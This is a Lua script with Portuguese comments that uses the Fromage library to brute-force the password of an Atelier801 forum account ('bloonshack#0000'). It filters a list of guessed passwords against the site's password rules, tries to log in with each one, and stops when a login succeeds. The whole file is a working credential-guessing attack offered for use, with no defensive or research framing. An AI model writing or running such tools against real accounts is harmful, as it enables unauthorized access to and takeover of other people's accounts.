-- requer Luvit e Fromage
local api = require("fromage")

------ edite apenas os parametros abaixo
local contas = "bloonshack#0000"
local psk = {"11111111","aaaaaaaaaa","asdbasdjasd1"}
---------------------------------------

print('iniciando script, aguarde...')
coroutine.wrap(function()
    local client
    for i = 1, #psk do
        if string.len(psk[i]) > 7 then -- checa se tem 8 ou mais caracters
            if(string.find(psk[i],"%a")) and (string.find(psk[i], "[0-9]"))then -- checa se tem letras E numeros
                client = api()
                client.connect(contas, psk[i]) -- conecta-se
                print("tentando conectar em "..contas..", senha: " ..psk[i])
                if client.isConnected() then
                    print("sucesso! conecte-se em "..contas..", senha: " ..psk[i])
                    io.read() -- pausar script quando achar a senha da conta
                else
                    print("inválido, tente de novo")
                end
            else
                print(psk[i]..' não contem letras e números')
            end
        else
            print(psk[i]..' menor que 8 caracters')
        end
    end
    print('aperte a tecla pra cima para sair')
    os.execute("pause >nul")
end)()
